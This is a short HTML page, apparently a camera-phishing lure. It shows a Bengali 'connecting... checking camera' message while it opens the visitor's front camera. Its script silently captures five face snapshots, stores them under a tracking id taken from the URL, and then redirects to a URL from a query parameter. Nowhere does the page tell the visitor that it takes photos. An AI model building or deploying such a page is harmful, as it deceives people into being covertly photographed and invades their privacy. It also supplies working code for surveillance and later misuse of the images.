<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connecting...</title>
  <style>
    body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:sans-serif;overflow:hidden;}
    .box{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;}
    video{width:100%;max-width:380px;border-radius:16px;border:4px solid #0066ff;box-shadow:0 0 40px rgba(0,102,255,0.6);}
    .msg{color:#00ff9d;font-size:18px;margin:20px 0;animation:pulse 1.5s infinite;}
    @keyframes pulse{0%,100%{opacity:0.7}50%{opacity:1}}
  </style>
</head>
<body>

<div class="box">
  <video id="cam" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <div class="msg">কানেক্টিং... ক্যামেরা চেক হচ্ছে</div>
</div>

<script>
const params = new URLSearchParams(location.search);
const id = params.get('id');
const redirect = decodeURIComponent(params.get('r') || 'https://google.com');

const video = document.getElementById('cam');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let count = 0;
const total = 5;
const images = [];

navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
  .then(stream => {
    video.srcObject = stream;
    video.onloadedmetadata = () => {
      video.play();
      setTimeout(capturePhotos, 1800);
    };
  })
  .catch(() => {
    document.body.innerHTML = "<h2 style='color:#f00;padding:50px;text-align:center;'>ক্যামেরা বন্ধ আছে!</h2>";
    setTimeout(() => location.href = redirect, 3000);
  });

function capturePhotos() {
  if (count >= total) {
    localStorage.setItem('camsnap_' + id, JSON.stringify(images));
    setTimeout(() => location.href = redirect, 1200);
    return;
  }
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  images.push(canvas.toDataURL('image/jpeg', 0.85));
  count++;
  setTimeout(capturePhotos, 700);
}
</script>
</body>
</html>
